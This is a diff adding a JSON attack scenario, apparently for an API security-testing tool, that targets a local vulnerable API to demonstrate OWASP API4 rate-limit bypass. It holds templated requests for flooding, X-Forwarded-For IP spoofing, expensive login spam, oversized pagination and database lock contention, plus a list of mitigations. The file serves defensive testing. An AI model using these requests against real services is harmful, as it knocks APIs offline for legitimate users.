@@ -1,0 +1,180 @@
+{
+  "id": "api4-rate-limit-bypass",
+  "name": "API4:2023 - Rate Limit Bypass & Resource Exhaustion",
+  "category": "API Security",
+  "difficulty": "Intermediate",
+  "description": "Exploits missing or weak rate limiting to exhaust API resources through automated high-volume requests and distributed IP rotation",
+  "kind": "scenario",
+  "tags": [
+    "owasp-api-4",
+    "rate-limiting",
+    "dos",
+    "resource-exhaustion",
+    "api"
+  ],
+  "target": "http://localhost:5000",
+  "estimatedDuration": "3-5 minutes",
+  "documentation": "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
+  "prerequisites": [
+    "Target API with weak or no rate limiting",
+    "VAmPI or similar vulnerable API recommended"
+  ],
+  "phases": [
+    {
+      "name": "reconnaissance",
+      "duration": 60,
+      "description": "Identify rate limit thresholds and bypass opportunities"
+    },
+    {
+      "name": "weaponization",
+      "duration": 120,
+      "description": "Prepare distributed IP pool and automation scripts"
+    },
+    {
+      "name": "delivery",
+      "duration": 300,
+      "description": "Execute high-volume requests across multiple IPs"
+    },
+    {
+      "name": "exploitation",
+      "duration": 240,
+      "description": "Exhaust resources and cause service degradation"
+    }
+  ],
+  "attackVectors": [
+    {
+      "classification": "UnrestrictedResourceConsumption",
+      "severity": "High",
+      "owasp": "API4:2023 Unrestricted Resource Consumption"
+    },
+    {
+      "classification": "DenialOfService",
+      "severity": "High",
+      "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling"
+    }
+  ],
+  "expectedResults": {
+    "successCriteria": [
+      "No HTTP 429 (Too Many Requests) responses",
+      "Successful bypass of IP-based rate limiting",
+      "Measurable increase in response times",
+      "Service degradation or timeout errors",
+      "Resource exhaustion (CPU, memory, connections)"
+    ],
+    "indicators": [
+      "All requests accepted without throttling",
+      "Response times increase from 50ms to 5000ms+",
+      "Server errors (500, 503) under load",
+      "Database connection pool exhaustion",
+      "API becomes unresponsive to legitimate users"
+    ]
+  },
+  "mitigations": [
+    "Implement rate limiting per IP, per user, and per API key",
+    "Use distributed rate limiting (Redis) for multi-server deployments",
+    "Set maximum pagination limits (e.g., max 100 results)",
+    "Implement request timeouts and circuit breakers",
+    "Add CAPTCHA for expensive operations",
+    "Monitor and alert on abnormal traffic patterns",
+    "Use CDN/WAF with built-in DDoS protection",
+    "Implement exponential backoff for failed auth attempts",
+    "Add cost-based rate limiting (different limits for different endpoints)",
+    "Use queue systems to handle spikes gracefully"
+  ],
+  "steps": [
+    {
+      "id": "baseline-request",
+      "name": "Establish baseline response time",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/createUser",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "test${ITERATION}",
+          "password": "pass123",
+          "email": "test${ITERATION}@example.com"
+        }
+      }
+    },
+    {
+      "id": "rapid-fire-requests",
+      "name": "Send 100+ requests per second from single IP",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/createUser",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "flood${ITERATION}",
+          "password": "pass123",
+          "email": "flood${ITERATION}@example.com"
+        }
+      }
+    },
+    {
+      "id": "ip-rotation-bypass",
+      "name": "Bypass IP-based rate limiting through header manipulation",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/createUser",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "${SOURCE_IP}"
+        },
+        "body": {
+          "username": "distributed${ITERATION}",
+          "password": "pass123",
+          "email": "dist${ITERATION}@example.com"
+        }
+      }
+    },
+    {
+      "id": "expensive-operation-spam",
+      "name": "Trigger expensive operations (password hashing) repeatedly",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "nonexistent_user_${ITERATION}",
+          "password": "very_long_password_that_causes_expensive_hashing_operations_123456789"
+        }
+      }
+    },
+    {
+      "id": "pagination-abuse",
+      "name": "Request extremely large result sets to exhaust memory",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/users/v1?limit=${LIMIT}"
+      }
+    },
+    {
+      "id": "resource-lock-contention",
+      "name": "Create database lock contention through concurrent writes",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/books/v1",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "book_title": "Flood Book ${ITERATION}",
+          "author": "Attacker"
+        }
+      }
+    }
+  ]
+}
